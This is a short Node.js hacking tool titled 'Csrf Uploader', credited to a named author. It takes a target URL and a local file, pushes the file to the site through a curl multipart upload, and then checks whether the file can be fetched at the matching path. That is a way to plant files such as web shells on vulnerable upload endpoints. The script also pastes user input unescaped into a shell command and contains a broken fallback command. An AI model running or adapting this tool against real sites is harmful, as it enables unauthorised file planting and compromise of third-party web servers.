// Please don't recode my program because a take a long time to create this project
// Copyright© 2019 By Fajar Firdaus
var req = require("request");
var c = require("colors");
var s = require("shelljs");
var r = require("readline");
var box = require("boxen");

console.log(c.blue(box("[===================]" + "\nCoder : Fajar Firdaus\n" + "FB : Fajar Firdaus\n" + "IG : fajar_firdaus_7\n" + "YT : iTech7732\n" + "GITHUB : FajarTheGGman\n" + "[===================]", {padding: 1})))

const q = r.createInterface({
    input : process.stdin,
    output : process.stdout
});

console.log(c.rainbow("\n[ Csrf Uploader ] By Fajar Firdaus\n"))

console.log(c.red("\n[!] Report bug to my social media\n"))

var user = c.rainbow("[ Input URL ] > ");
var sh = c.rainbow("\n[ Input File ] > ");

q.question(user, (u) => {
q.question(sh, (n) => {
s.exec("curl -F files=@" + `${n}` + " " + `${u}` + " /B foo > NUL 2>&1" || "curl -F files=@" + `${n}` + " " + `${u}` + " > /dev/null 2>&1");
setInterval(() => {
req(`${u}` + "/" + `${n}`, function(error, response, body){
    if(response.statusCode == 200){
        console.log(c.green("[+] " + `${u}` + `${n}` + " > [File Berhasil di upload]"));
        process.exit(1);
    }else if(response.statusCode == 404){
        console.log(c.red("[!] " + `${u}` + "/" + `${n}` + " > [File Gagal di upload]"));
        process.exit(1);
    }
})
}, 4000);
})
})
